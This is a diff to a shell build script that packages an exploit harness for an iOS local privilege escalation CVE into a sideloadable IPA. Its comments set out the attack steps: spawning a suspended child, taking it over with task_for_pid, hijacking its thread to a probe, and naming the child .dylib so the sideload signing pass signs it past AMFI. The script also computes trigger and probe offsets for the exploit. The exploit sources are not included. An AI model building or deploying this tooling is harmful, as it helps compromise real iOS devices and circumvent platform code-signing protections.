@@ -1,34 +1,40 @@
 #!/bin/sh
-# build-ios.sh - build the CVE-2026-43724 (DirtySlide/Rie) first-mapper harness for iOS arm64/arm64e.
-# Produces dist/Payload/LPE.app/{LPE (host+child in one image), Info.plist} -> zip to an IPA.
+# build-ios.sh - build the CVE-2026-43724 first-mapper harness for iOS (arm64).
+# Two binaries:
+#   LPE            -> the app's main executable (host_ios.c): spawns the child SUSPENDED|RESLIDE,
+#                     task_for_pid()s it, hijacks its main thread to child_probe, reports errno.
+#   libchild.dylib -> the child (child.c): raw-syscall-only code that runs PRE-dyld.
+# The child is named .dylib on purpose: our iloader/isideload signing pass signs every *.dylib
+# in the bundle with the personal-team certificate, which is what AMFI needs to exec it.
 set -e
 
 SDK=$(xcrun --sdk iphoneos --show-sdk-path)
 ARCH=arm64
 DIST=dist
 APP="$DIST/Payload/LPE.app"
-
-# child's main() must not collide with host's main(); we spawn OUR OWN executable as the
-# suspended/RESLIDE child, so one image carries both roles.
-sed 's/^int main(void)/int child_main_unused(void)/' child.c > child_nomain.c
-
 CC="clang -arch $ARCH -isysroot $SDK -miphoneos-version-min=16.0 -O0 -g -Wall -fno-stack-protector"
 
-echo "[*] building combined host+child image..."
-$CC -o "$APP/LPE" host.c child_nomain.c
+mkdir -p "$APP"
 
-# resolve child_probe's offset inside the image so the host can hijack the suspended thread
-PROBE_ADDR=$(nm "$APP/LPE" | awk '/ _child_probe$/ {print $1}')
-TEXT_VMADDR=$(otool -l "$APP/LPE" | awk '/segname __TEXT/{f=1} f&&/vmaddr/{print $2; exit}')
+# child's main() must not collide: we never run the child's main (it is hijacked pre-dyld)
+sed 's/^int main(void)/int child_main_unused(void)/' child.c > child_nomain.c
+
+echo "[*] building child..."
+$CC -o "$APP/libchild.dylib" child_nomain.c
+
+# child_probe offset (relative to the child's __TEXT base) is what the host needs
+PROBE_ADDR=$(nm "$APP/libchild.dylib" | awk '/ _child_probe$/ {print $1}')
+TEXT_VMADDR=$(otool -l "$APP/libchild.dylib" | awk '/segname __TEXT/{f=1} f&&/vmaddr/{print $2; exit}')
 OFF=$(printf '0x%x' $(( 0x$PROBE_ADDR - 0x$TEXT_VMADDR )))
 echo "#define PROBE_OFFSET $OFF" > probe_off.h
-echo "[*] child_probe @ 0x$PROBE_ADDR, __TEXT 0x$TEXT_VMADDR => PROBE_OFFSET=$OFF"
-
-# trigger offset (child_trigger) as well
-TRIG_ADDR=$(nm "$APP/LPE" | awk '/ _child_trigger$/ {print $1}')
+TRIG_ADDR=$(nm "$APP/libchild.dylib" | awk '/ _child_trigger$/ {print $1}')
 TRIG_OFF=$(printf '0x%x' $(( 0x$TRIG_ADDR - 0x$TEXT_VMADDR )))
 echo "#define TRIGGER_OFFSET $TRIG_OFF" > trig_off.h
+echo "[*] child_probe @ 0x$PROBE_ADDR, __TEXT 0x$TEXT_VMADDR => PROBE_OFFSET=$OFF"
 echo "[*] child_trigger @ 0x$TRIG_ADDR => TRIGGER_OFFSET=$TRIG_OFF"
+
+echo "[*] building host..."
+$CC -I. -o "$APP/LPE" host_ios.c
 
 cat > "$APP/Info.plist" <<PLIST
 <?xml version="1.0" encoding="UTF-8"?>
@@ -50,13 +56,13 @@ cat > "$APP/Info.plist" <<PLIST
 </plist>
 PLIST
 
-# ad-hoc sign the image so the bundle is at least structurally valid; our own iloader
-# pass later re-signs the whole app with the personal-team certificate.
+codesign -s - --force "$APP/libchild.dylib" 2>/dev/null || true
 codesign -s - --force "$APP/LPE" 2>/dev/null || true
-codesign -s - --force --entitlements host.entitlements "$APP/LPE" 2>/dev/null || true
 
 cd "$DIST"
+rm -f ../LPE.ipa
 zip -q -r -X ../LPE.ipa Payload
 cd ..
 echo "[+] built dist/LPE.ipa"
-ls -la dist/LPE.ipa
+ls -la dist/LPE.ipa dist/Payload/LPE.app/
+file dist/Payload/LPE.app/LPE dist/Payload/LPE.app/libchild.dylib
